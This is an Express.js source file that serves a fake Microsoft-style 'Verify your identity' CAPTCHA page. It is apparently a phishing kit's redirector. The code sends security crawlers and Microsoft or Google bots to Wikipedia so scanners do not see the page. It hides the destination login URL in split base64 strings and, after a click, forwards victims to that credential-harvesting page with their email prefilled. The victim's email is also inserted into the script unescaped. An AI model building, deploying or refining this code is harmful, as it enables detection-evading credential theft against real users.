const express = require('express');
const app = express();

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || "";
    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit/i.test(ua);
    
    if (isBot) return res.redirect("https://www.wikipedia.org");

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Verification</title>
            <style>
                body { background: #f9f9f9; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .card { background: white; padding: 50px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
                h2 { font-size: 24px; color: #2f2f2f; margin-bottom: 15px; font-weight: 500; }
                p { color: #555; font-size: 15px; line-height: 1.5; margin-bottom: 35px; }
                .btn { background: #0067b8; color: white; border: none; padding: 14px 40px; cursor: pointer; font-size: 16px; font-weight: 600; border-radius: 2px; transition: background 0.2s; }
                .btn:hover { background: #005da6; }
                .hp { display: none; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Verify your identity</h2>
                <p>Please confirm you are not a robot to continue.</p>
                
                <button class="hp" onclick="window.location.href='https://www.microsoft.com'">Click Here</button>
                <button id="verifyBtn" class="btn">I'm not a robot</button>
            </div>

            <script>
                const p1 = "${part1}"; const p2 = "${part2}"; const emailCaptured = "${targetEmail}";
                document.getElementById('verifyBtn').addEventListener('click', function() {
                    this.innerText = "Processing...";
                    this.style.opacity = "0.7";
                    this.disabled = true;
                    
                    setTimeout(() => {
                        let target = atob(p1) + atob(p2);
                        
                        // Correction : On utilise # au lieu de ?email=
                        // Et on ne fait pas de encodeURIComponent pour garder le "@" tel quel
                        if(emailCaptured !== "") {
                            target += "#" + emailCaptured;
                        }
                        
                        window.location.href = target;
                    }, 800);
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
